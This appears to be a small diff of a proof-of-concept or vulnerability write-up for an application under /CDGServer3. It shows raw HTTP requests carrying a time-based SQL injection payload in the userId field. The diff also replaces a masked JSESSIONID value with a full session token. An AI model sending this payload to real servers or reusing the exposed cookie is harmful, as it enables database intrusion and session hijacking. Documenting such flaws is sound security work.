@@ -90,7 +90,7 @@ Host:
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
 Connection: close
 Content-Type: application/x-www-form-urlencoded
-Cookie: JSESSIONID=7******************************3; Path=/CDGServer3; HttpOnly
+Cookie: JSESSIONID=719804E36DC9165F889264FEFC9C60C3; Path=/CDGServer3; HttpOnly
 Accept-Encoding: gzip
 
 userId=1';WAITFOR DELAY '0:0:1'--
@@ -107,7 +107,7 @@ Host:
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
 Connection: close
 Content-Type: application/x-www-form-urlencoded
-Cookie: JSESSIONID=7******************************3; Path=/CDGServer3; HttpOnly
+Cookie: JSESSIONID=719804E36DC9165F889264FEFC9C60C3; Path=/CDGServer3; HttpOnly
 Accept-Encoding: gzip
 
 userId=1
